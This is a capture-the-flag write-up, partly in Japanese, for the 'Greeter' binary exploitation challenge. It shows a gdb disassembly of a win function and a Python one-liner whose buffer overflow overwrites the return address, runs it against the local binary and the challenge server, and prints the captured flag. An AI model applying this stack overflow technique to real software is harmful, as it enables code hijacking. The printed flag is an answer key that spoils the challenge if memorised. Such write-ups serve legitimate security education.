# Greeter:Binary Exploitation:150pts
I'm really not sure who thought this thing was necessary, but here's a person-greeter-as-a-service!  
nc challenges.ctfd.io 30249  
[greeter](greeter)　　　　[greeter.c](greeter.c)  

# Solution
greeter.cを見ると自明なBOFがある。  
winを呼び出せばいいようだ。  
```bash
$ gdb ./greeter
~~~
gdb-peda$ disass win
Dump of assembler code for function win:
   0x0000000000401220 <+0>:     push   rbp
   0x0000000000401221 <+1>:     mov    rbp,rsp
   0x0000000000401224 <+4>:     sub    rsp,0x50
   0x0000000000401228 <+8>:     mov    edi,0x40206b
   0x000000000040122d <+13>:    call   0x401030 <puts@plt>
~~~
   0x000000000040128f <+111>:   mov    rdi,rax
   0x0000000000401292 <+114>:   call   0x401040 <fclose@plt>
   0x0000000000401297 <+119>:   nop
   0x0000000000401298 <+120>:   leave
   0x0000000000401299 <+121>:   ret
End of assembler dump.
gdb-peda$ q
$ python -c 'print("A"*64 + "\x20\x12\x40\x00\x00\x00\x00\x00")' | ./greeter
What's your name?
Why hello there AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA @!
congrats! here's your flag:
flag file not found!
$ python -c 'print("A"*64 + "\x20\x12\x40\x00\x00\x00\x00\x00")' | nc challenges.ctfd.io 30249
What's your name?
Why hello there AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA @!
congrats! here's your flag:
nactf{n4v4r_us3_g3ts_5vlrDKJufaUOd8Ur}
What's your name?
^C
```
flagが得られた。  

## nactf{n4v4r_us3_g3ts_5vlrDKJufaUOd8Ur}